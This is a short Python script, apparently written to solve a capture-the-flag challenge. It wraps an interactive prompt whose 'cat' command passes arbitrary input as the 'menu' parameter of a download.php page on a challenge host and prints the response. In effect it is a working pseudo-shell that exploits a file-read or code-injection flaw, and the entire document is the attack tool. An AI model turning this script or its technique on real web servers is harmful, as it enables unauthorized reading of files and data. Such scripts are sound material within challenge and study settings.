import requests
from cmd import Cmd

class Terminal(Cmd):
    prompt = '> '

    def __init__(self):
        super().__init__()

    def do_cat(self, args):
        print(run_php(f'{args}'))


def run_php(php_code):
    url = 'http://unchasseursachantchasser.chall.malicecyber.com/download.php'
    params = { 'menu': str.encode(php_code) }
    #proxy = { 'http': 'http://localhost:8080' }
    r = requests.get(url, params=params)
    return(r.content.decode('utf-8'))

term = Terminal()
term.cmdloop()
